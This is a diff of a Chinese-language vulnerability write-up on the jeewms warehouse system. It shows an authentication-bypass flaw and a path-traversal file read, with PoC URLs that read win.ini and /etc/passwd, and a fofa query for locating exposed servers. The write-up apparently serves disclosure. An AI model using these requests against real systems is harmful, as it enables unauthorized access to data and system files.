@@ -109,7 +109,7 @@ fofa 语句：body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" && body=" 仓
 
 jeewms 使用 JAVA 拦截器做的权限控制，存在被绕过漏洞，代码如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruoZHO1lto1DaNGzQbEEmkRFnxUzEviaaKficsKNzlMfJTiatyeTjW4hhww/640?wx_fmt=png)
+![](../../.resource/remote/5ad52f05b6851aa813db2ab6cbe21fb0f0ddfdbe5eaa8c541677c9262393bfe5.png)
 
 可以看到第一个 if 判断中只要 0-5 个字符串是 rest / 就返回 true，意思是无需认证
 
@@ -117,17 +117,17 @@ jeewms 使用 JAVA 拦截器做的权限控制，存在被绕过漏洞，代码�
 
 **正常数据包**：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruib3hR7nFKBDbsvJf9Wm75fo5U2nxiaiaibsQCbc1ZhBHyPLqE9PqmMR9Yw/640?wx_fmt=png)
+![](../../.resource/remote/9f39c43360246ccf39f267a5a3b4440f92bb09d3366ce2f67aa455bf640c9f5c.png)
 
 **删除 Cookie 数据包**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruaOppicjbDbSRn4VJ48aUdH3Z7dydeav8mXjrkvM9MFRFqLVEbUJbYJA/640?wx_fmt=png)
+![](../../.resource/remote/5045b5f3cab009468b6e4cc439571f23d85ec7acea7d65d064e78562d1653957.png)
 
 **使用 POC 数据包**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ru5joRs9FImuUVgpelcpyKCrFhyib8swTrzdDIXdU3CdIvdnvPsbd8akQ/640?wx_fmt=png)
+![](../../.resource/remote/db0ab383dc2a49ff5feb84467087f7a1ce9b0954e5eb42e66f7baf85baacfbbe.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2rufhmm3ibibicD31sBztfsh4mEvTDQp7kFpKwjSSehQu5TrbXF79RPmEwAQ/640?wx_fmt=png)
+![](../../.resource/remote/2f30d4cbef7b91157dff6f72bf37d5e87c4206b494f307eb19466c81025c5151.png)
 
 **可以看到已经绕过登录获取到数据，数据包:**
 
@@ -173,7 +173,7 @@ page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
 
 代码如下：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruTXqyqfiadhhscXRbmAXKMfJfKRVj9OZVmQdEGRmniby74srSLIGfy6Qw/640?wx_fmt=png)
+![](../../.resource/remote/1a4c986ddc25d7a27c702f4771f1537eaab3a5a39a0ffca6a7292875c3d47145.png)
 
 可以看到 dbpath 可被控制，最终读取路径为：系统配置路径 + dbpath
 
@@ -185,23 +185,23 @@ POC：
 http://x.x.x.x:8088/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ru9Y6ldXJLalpmGcP8bWRKncX8JSibnMYoontTNoSp8hRvomWmKFNK4HQ/640?wx_fmt=png)
+![](../../.resource/remote/9740460f1f2953e0635c732add40a8c46a0ed7a0fbdddf07ff0199cb1ddcc08e.png)
 
 ```
 http://x.x.x.x:8020/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruObQUgrWo9NrBUXohhMTpTiar2eEsNR9te4UIoGxgDsHviacdjnruKF7w/640?wx_fmt=png)
+![](../../.resource/remote/9665329bfc2f43eb4df92faf92f008f5d0613b80d488f7d0f6ac8cf202dcd578.png)
 
 公众号
 
 最后再给大家介绍一下漏洞库，地址：wiki.xypbk.com  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruC6mJg4KJiaTLnzne7w4qraaB6SO9iaCpBDufyKficZobmJolBlnFicWHpw/640?wx_fmt=png)
+![](../../.resource/remote/0ce0fc3f0c89c4cd9b6728b143cc0355198508f9fa8c6eb453ed5c255593b872.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2rur7RMzhZOzp8XKibxMGTkJY5F2EBexNxIA3pibcAuYr24WYhfm2zQ46Og/640?wx_fmt=png)
+![](../../.resource/remote/379fd6bf8f0a7e1187b264a408baa8d195e66ad9f5536a623f74fd829079ebc2.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruib8N3ggtVKgjpxPP4kQrWDla13YBSeukib04BuFxhB7Q3UowJKI0iagicQ/640?wx_fmt=png)
+![](../../.resource/remote/84ab43b06699d9ed289fb3e9c9bb714a3e9b9a78b7390e9b43cc3a883c106414.png)
 
 漏洞库内容来源于互联网 && 零组文库 &&peiqi 文库 && 自挖漏洞 && 乐于分享的师傅，供大家方便检索，绝无任何利益。
 
